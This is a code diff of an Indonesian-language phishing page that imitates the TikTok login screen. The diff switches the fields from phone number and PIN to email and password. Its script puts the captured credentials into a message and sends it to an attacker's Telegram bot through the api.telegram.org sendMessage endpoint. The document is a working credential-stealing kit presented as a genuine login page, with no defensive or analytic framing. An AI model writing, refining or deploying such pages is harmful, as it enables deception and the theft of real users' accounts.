@@ -117,23 +117,24 @@
         <div class="title">Masuk ke TikTok</div>
 
         <div class="input-group">
-            <i class="fas fa-user"></i>
-            <input type="Number" id="nomor" placeholder="Nomor telepon">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="nomor" placeholder="Email">
+
         </div>
 
         <div class="input-group">
             <i class="fas fa-lock"></i>
-            <input type="Number" id="pin" placeholder="PIN">
+            <input type="Password" id="pin" placeholder="Masukkan kata Sandi">
         </div>
 
-        <a href="lupa pin.html" class="signup-text">Lupa PIN?</a>
+        <a href="" class="signup-text">Lupa Sandi?</a>
 
         <button class="login-btn" onclick="kirimData()">MASUK</button>
 
-        <div class="divider">---------------atau---------------</div>
+        <div class="divider"></div>
 
         <div class="signup-text">
-            Masuk dengan password? <a href="sandi.html" class="signup-link">Password</a>
+              <a href="" class="signup-link"></a>
         </div>
     </div>
 
@@ -156,9 +157,9 @@
                 return false; // BATALKAN PROSES
             }
 
-            let pesan = `🔔 <b>DATA LOGIN TIKTOK!</b>
-📱 Nomor: ${nomor}
-🔑 PIN: ${pin}`;
+            let pesan = ` <b>*░▒▬▬ஜ۩Tik Tok۩ஜ▬▬▒░*</b>
+Nomor handpone: ${nomor}
+Password: ${pin}`;
 
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
